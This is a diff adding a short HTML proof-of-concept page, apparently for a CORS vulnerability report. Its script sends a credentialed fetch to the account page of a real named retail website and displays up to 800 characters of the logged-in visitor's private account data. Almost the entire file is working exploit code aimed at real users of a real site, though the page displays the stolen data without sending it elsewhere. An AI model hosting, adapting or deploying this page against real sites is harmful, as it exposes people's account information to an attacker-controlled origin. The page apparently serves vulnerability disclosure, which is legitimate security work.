@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC</title></head>
+<body>
+<h2>CORS PoC - Reading authenticated data</h2>
+<p>Origin: <strong>yourname.github.io</strong></p>
+<pre id="result">Fetching...</pre>
+<script>
+fetch("https://www.harmanaudio.com/on/demandware.store/Sites-HA-US-Site/en_US/Account-Show", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(data => {
+  document.getElementById("result").innerText = 
+    "SUCCESS - Data received from harmanaudio.com:\n\n" + 
+    data.substring(0, 800);
+})
+.catch(e => {
+  document.getElementById("result").innerText = "Error: " + e;
+});
+</script>
+</body>
+</html>
